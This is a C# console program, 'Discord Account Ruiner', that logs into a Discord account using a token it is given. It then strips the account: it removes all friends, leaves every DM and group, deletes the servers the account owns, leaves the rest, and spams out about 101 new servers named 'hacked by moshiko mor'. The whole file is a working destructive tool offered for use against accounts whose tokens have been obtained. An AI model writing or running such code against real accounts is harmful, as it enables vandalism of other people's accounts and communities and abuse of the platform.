using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Discord;
using Discord.Gateway;

namespace Discord_Account_Ruiner
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Title = "discord account ruiner | made by moshiko mor";

            Console.WriteLine("enter token:");
            string token = Console.ReadLine();

            DiscordSocketClient client = new DiscordSocketClient(new DiscordSocketConfig()
            {
                Intents = DiscordGatewayIntent.Guilds | DiscordGatewayIntent.GuildMessages
            });
            client.OnLoggedIn += client_OnLoggedIn;
            client.Login(token);

            Thread.Sleep(-1);
        }

        static async void client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine($"logged in : {client.User.Username}#{client.User.Discriminator}\n");

            if (!ValidateWithUser())
                Environment.Exit(1);

            Console.WriteLine("1. removing friends\n");

            foreach (DiscordRelationship friend in await client.GetRelationshipsAsync())
            {
                try
                {
                    Console.WriteLine($"removing {friend.User.Username}#{friend.User.Discriminator} | {friend.User.Id}");
                    await friend.RemoveAsync();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            Console.WriteLine("2. removing dms and leaving groups\n");

            foreach (PrivateChannel channel in await client.GetPrivateChannelsAsync())
            {
                try
                {
                    Console.WriteLine($"removing / leaving {channel.Name}");
                    await channel.LeaveAsync();
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            Console.WriteLine("3. leaving and deleting guilds\n");

            foreach (PartialGuild guild in await client.GetGuildsAsync())
            {
                try
                {
                    if (guild.Owner)
                    {
                        Console.WriteLine($"removing {guild.Name}");
                        await guild.DeleteAsync();
                    }
                    else
                    {
                        Console.WriteLine($"leaving {guild.Name}");
                        await guild.LeaveAsync();
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            Console.WriteLine("4. creating new server ;)\n");

            for (int i = 0; i <= 100; i++)
            {
                try
                {
                    Console.WriteLine($"creating server number {i}");
                    await client.User.Client.CreateGuildAsync("hacked by moshiko mor");
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }
            }

            Console.WriteLine("\ndone. made by moshiko mor");
            Console.ReadLine();
            Environment.Exit(1);
        }

        static bool ValidateWithUser()
        {
            Console.WriteLine("are you 100% sure that you want to ruin this account?");
            string answer = Console.ReadLine();

            if (answer == null || !answer.ToLower().StartsWith("y")) return false;

            Console.WriteLine("ARE YOU SURE???");
            answer = Console.ReadLine();

            return answer != null && answer.ToLower().StartsWith("y");
        }
    }
}
